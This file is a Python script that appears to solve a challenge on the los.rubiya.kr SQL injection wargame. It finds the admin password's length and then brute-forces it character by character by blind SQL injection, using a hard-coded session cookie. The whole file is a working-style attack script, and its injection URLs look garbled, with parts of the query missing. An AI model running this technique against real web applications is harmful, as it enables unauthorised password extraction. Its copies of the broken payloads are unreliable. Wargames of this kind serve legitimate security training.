#!/usr/bin/python3
#-*- coding: utf-8 -*-

import urllib3
import requests
import time

flag = ""
length = 1
result = ""

session = dict(PHPSESSID="ckodq6o9k9qjamdq5in4oktego")

# find the length of PassWord
for i in range(0, 20):
    try:
        r = requests.post("https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?"+str(i)+"%23", cookies=session)
    except:
        print("exception_length")
        continue

    if 'Hello admin' in r.text:
        length = i
        break

print("[+] Length of admin PW : " + str(length))
print("[+] ----------------------------------------[+]")


for k in range(1, length+1):
    for j in range(48, 126):
        try:
            r = requests.post("https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"+ str(k) +",1))="+str(j)+"%23", cookies=session)
        except:
            print("exception_flag")
            continue
        if 'Hello admin' in r.text:
            flag = flag + chr(j)
            print("[+] finding PW : " + flag, j)
        time.sleep(0.1)

result = flag.lower()
print("[+] pw of admin : " + result)
